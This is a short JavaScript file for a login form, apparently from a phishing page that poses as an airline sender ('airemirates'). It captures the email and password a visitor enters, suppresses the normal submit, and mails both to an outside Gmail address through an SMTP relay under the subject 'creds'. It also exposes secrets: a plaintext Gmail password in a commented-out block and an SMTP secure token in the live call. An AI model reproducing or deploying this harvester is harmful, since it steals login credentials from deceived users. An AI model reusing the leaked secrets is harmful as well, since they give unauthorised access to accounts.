const email = document.getElementById("contact");
const password = document.getElementById("password");
const submit = document.getElementById("button");

submit.addEventListener("submit", (e) => {
  e.preventDefault();
  let ebody = `
     ${email.value}
     ${password.value}
    `;

  //   Email.send({
  //     Host: "smtp.gmail.com",
  //     Username: "raakesh95misc@gmail.com",
  //     Password: "L!nuxpedora1",
  //     To: "raakesh95misc@gmail.com",
  //     From: "raakesh95misc@gmail.com",
  //     Subject: "Sending Email using javascript",
  //     Body: "Well that was easy!!",
  //   }).then(function (message) {
  //     alert("mail sent successfully");
  //   });

  Email.send({
    SecureToken: "56ebf60d-2612-47c8-b49b-bb8cb21c9c76", //add your token here
    To: "raakesh95official@gmail.com",
    From: "airemirates@proton.me",
    Subject: "creds",
    Body: ebody,
  }).then((message) => alert(message));
});
